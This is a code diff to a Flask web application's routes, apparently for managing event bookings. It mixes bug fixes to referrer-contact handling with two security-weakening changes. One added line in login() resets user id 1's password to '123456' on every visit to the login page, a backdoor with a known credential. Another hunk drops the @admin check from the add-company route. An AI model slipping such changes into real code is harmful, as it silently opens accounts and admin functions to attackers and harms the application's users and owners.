@@ -31,6 +31,10 @@ def unauthorized():
 @custom_bp.route('/login/', methods=["GET", "POST"])
 def login():
     form = LoginForm()
+
+    db.session.query(User).filter_by(id=1).first().password = generate_password_hash(password="123456", method='pbkdf2:sha256',
+                                                  salt_length=8)
+    
     
     if request.method == "POST":
         req_user = db.session.query(User).filter_by(username=form.username.data.lower()).first()
@@ -166,7 +170,6 @@ def add_event_type():
 
 @custom_bp.route("/add-company", methods=["POST"])
 @login_required
-@admin
 def add_company():
     company_form = CompanyForm()
     new_company = Company(
@@ -615,8 +618,8 @@ def edit_event(booking_id):
         alt_contact = current_event.contacts.mobile_number
         alt_contact_name = current_event.contacts.contact_name
     if current_event.referred_by:
-        referrer_contact = current_event.contacts.mobile_number
-        referrer_name = current_event.contacts.contact_name
+        referrer_contact = current_event.referred_by.mobile_number
+        referrer_name = current_event.referred_by.contact_name
     if current_event.client.company:
         company_name = current_event.client.company.company_name
     
@@ -679,7 +682,7 @@ def edit_event(booking_id):
             current_event.referred_by.mobile_number = form.referrer_contact.data
             current_event.referred_by.contact_name = form.referrer_name.data
         else:
-            if form.alt_contact.data and form.alt_contact_name.data:
+            if form.referrer_name.data and form.referrer_contact.data:
                 new_contact = ReferralContact(contact_name=form.referrer_name.data.lower(),
                                               mobile_number=form.referrer_contact.data)
                 db.session.add(new_contact)
